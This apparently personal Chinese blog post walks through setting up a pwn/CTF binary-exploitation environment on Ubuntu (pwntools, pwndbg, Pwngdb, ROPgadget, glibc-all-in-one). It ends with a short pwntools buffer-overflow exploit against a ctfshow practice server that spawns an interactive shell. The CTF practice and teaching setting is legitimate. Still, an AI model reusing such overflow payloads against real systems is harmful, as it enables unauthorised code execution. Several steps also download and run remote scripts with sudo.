+++
title = "Ubuntu16.04配置pwn基础环境"
slug = "ubuntu-1604-pwn-environment-setup"
description = "pwn的环境总得有吧"
date = "2024-09-03T20:27:38"
lastmod = "2024-09-03T20:27:38"
image = ""
license = ""
categories = ["talk"]
tags = ["工具"]
+++

# 0x01 前言

其实我觉得二进制这个东西还是比较神圣的,虽然我不会,但是我不能没有环境哇

# 0x02 action

## 16.04

安装VMtools，网上有教程，我的莫名其妙就好了

```
sudo apt update
sudo apt install curl # 安装 curl 下载工具
```

```
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
python get-pip.py
```

```
sudo apt-get install python-setuptools python-dev build-essential
sudo apt-get install python-setuptools
pip install --upgrade --no-deps --force-reinstall pathlib
pip install pathlib2
```

```
pip install pwntools 
```

```
sudo apt-get install gdb
sudo apt-get install git

git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

git clone https://github.com/scwuaptx/Pwngdb.git 
git clone https://github.com/pwndbg/pwndbg

wget https://bootstrap.pypa.io/pip/3.5/get-pip.py
python3 get-pip.py
(如果发现没有安装pip3, 尝试 sudo python3 get-pip.py)

cd ~/pwndbg
./setup.sh

cd ../
cp ~/Pwngdb/.gdbinit ~/
sudo apt install vim
vim ~/.gdbinit
```

文件内容如下

```
#source ~/peda/peda.py
source ~/pwndbg/gdbinit.py
source ~/Pwngdb/pwngdb.py
source ~/Pwngdb/angelheap/gdbinit.py

define hook-run
python
import angelheap
angelheap.init_angelheap()
end
end
```

就这样吧

## 20.04.6

这个就是因为凌晨的时候，一位师傅(**iyheart**)知道我要安装pwn环境但是迟迟没动，但是同时新生不是来了嘛，很多新生都在学习这玩意，于是**starrsky**师傅写了一篇文章来弄，所以这里的基本就是和她写的差不多，就记录一下

这里重点说一下，选择`y or n`，全部都是`y`

镜像链接

```
https://releases.ubuntu.com/20.04.6/ubuntu-20.04.6-desktop-amd64.iso
```

先更新,然后下载`vim`，先进`root`不然不好使

```
sudo su
```

输入自己的密码

```
sudo apt upgrade

sudo apt install vim
```

为了不一条条的来，师傅也是很贴心，直接写文件来运行文件即可 是在主目录下面进行的

```
vim test.sh

按Esc 再 :wq

chmod 777 test.sh
看权限给上了没有
ls -l test.sh

./test.sh
```

文件内容

```sh
#!/bin/bash
cd ~
sudo apt install tzdata
sudo apt install vim
sudo apt install libxml2-dev
sudo apt install libxslt-dev
sudo apt install libmysqlclient-dev
sudo apt install libsqlite3-dev
sudo apt install zlib1g-dev
sudo apt install python2-dev
sudo apt install python3-pip
sudo apt install libffi-dev
sudo apt install libssl-dev
sudo apt install wget
sudo apt install curl
sudo apt install gcc
sudo apt install clang
sudo apt install make
sudo apt install zip
sudo apt install build-essential
sudo apt install libncursesw5-dev libgdbm-dev libc6-dev
sudo apt install tk-dev
sudo apt install openssl
sudo apt install virtualenv
sudo apt install git
sudo apt install proxychains4
sudo apt install ruby-dev

#setuptools 36.6.1 -> python2
wget https://mirrors.aliyun.com/pypi/packages/56/a0/4dfcc515b1b993286a64b9ab62562f09e6ed2d09288909aee1efdb9dde16/setuptools-36.6.1.zip
unzip setuptools-36.6.1.zip
cd setuptools-36.6.1
sudo python2 setup.py install
cd ../
sudo rm -rf setuptools-36.6.1 setuptools-36.6.1.zip

#setuptools 65.4.1 -> python3
wget https://mirrors.aliyun.com/pypi/packages/03/c9/7b050ea4cc4144d0328f15e0b43c839e759c6c639370a3b932ecf4c6358f/setuptools-65.4.1.tar.gz
tar -zxvf setuptools-65.4.1.tar.gz
cd setuptools-65.4.1
sudo python3 setup.py install
cd ../
sudo rm -rf setuptools-65.4.1 setuptools-65.4.1.tar.gz

#pip
wget https://mirrors.aliyun.com/pypi/packages/53/7f/55721ad0501a9076dbc354cc8c63ffc2d6f1ef360f49ad0fbcce19d68538/pip-20.3.4.tar.gz
tar -zxvf pip-20.3.4.tar.gz
cd pip-20.3.4
sudo python2 setup.py install
sudo python3 setup.py install
cd ../
sudo rm -rf pip-20.3.4 pip-20.3.4.tar.gz

sudo pip2 config set global.index-url https://mirrors.aliyun.com/pypi/simple
sudo pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple

sudo python2 -m pip install --upgrade pip
sudo python3 -m pip install --upgrade pip

pip3 install --upgrade pip
sudo pip2 install pathlib2
```

然后`pwntools`这些杂七杂八的东西

```
sudo python2 -m pip install --upgrade pwntools
sudo python3 -m pip install --upgrade pwntools
```

这中途肯定有黄色的警告，没关系，知识因为python2.7不维护了而已，继续干

```
wget https://starrysky1004.github.io/pwnenv.zip
unzip pwnenv.zip && rm pwnenv.zip

#pwndbg
git clone https://github.91chi.fun/https://github.com/pwndbg/pwndbg.git
cd pwndbg
./setup.sh
cd ../

#Pwngdb
cd ~/
git clone https://github.com/scwuaptx/Pwngdb.git 
cp ~/Pwngdb/.gdbinit ~/

vim ~/.gdbinit
#注释掉第一行 然后在第二行写入
source ~/pwndbg/gdbinit.py
然后保存
```

这里有clone的操作，所以可能会失败，但是多试几次就可以了，

```
#source ~/peda/peda.py
source ~/pwndbg/gdbinit.py
source ~/Pwngdb/pwngdb.py
source ~/Pwngdb/angelheap/gdbinit.py

define hook-run
python
import angelheap
angelheap.init_angelheap()
end
end
```

检查一下

```
gdb
```

有回显就对了

```
sudo apt install patchelf
```

```
git clone https://github.com/matrix1001/glibc-all-in-one.git
cd glibc-all-in-one
python3 update_list
cat list
```

```
sudo pip3 install capstone filebytes unicorn keystone-engine ropper
```

```
sudo apt-get install qemu-system
```

```
sudo -H python3 -m pip install ROPgadget
```

```
sudo gem install one_gadget
sudo gem install seccomp-tools
```

`one_gadget`安装失败了，要ruby3.1，但是我不敢动

那安装一下这个

````
sudo apt install gem
gem install elftools -v 1.2.0
````

还是不行，但是我不敢动啊，哈哈算了不管了这，找个demo试试能不能用，别忘记重启

## demo

**ctfshow pwn02**

```python
from pwn import *
#sh = process("./stack")
sh=remote("pwn.challenge.ctf.show",28236)
sys_addr = 0x8048518
sh.recv()
payload = b'a'*13 + p32(sys_addr)
sh.sendline(payload)
sh.interactive()
```

成功了

最近要去打awdp，专门又装了一台虚拟机来用，把一些常见的环境都来补上

```
sudo apt update && sudo apt upgrade -y

sudo apt install -y golang-go
go version

sudo apt install -y php php-cli php-mbstring php-xml php-curl php-zip php-gd
php -v

sudo apt install -y nodejs npm
node -v
npm -v

sudo apt install -y build-essential
gcc --version
make --version
```

安装Java11和Java17以及8

```
sudo apt install -y openjdk-8-jdk openjdk-11-jdk openjdk-17-jdk
java -version
javac -version
```

切换版本呢

```
# 列出安装好的Java
sudo update-alternatives --config java
```

输出的样例

```
baozongw1@ubuntu:~/Desktop$ sudo update-alternatives --config java
There are 3 choices for the alternative java (providing /usr/bin/java).

  Selection    Path                                            Priority   Status
------------------------------------------------------------
* 0            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      auto mode
  1            /usr/lib/jvm/java-11-openjdk-amd64/bin/java      1111      manual mode
  2            /usr/lib/jvm/java-17-openjdk-amd64/bin/java      1711      manual mode
  3            /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java   1081      manual mode
```

选择要用的，我这里用Java8所以选择3，然后`enter`，同样的，javac也要更换

```
sudo update-alternatives --config javac
```



# 0x03 小结

这个东西我一直都想要的，只不过之前那台Ubuntu16，网络出了问题，giao了就一直没有搞，这几天也是有机会弄了，这些都是基础环境后面应该还有东西会更吧
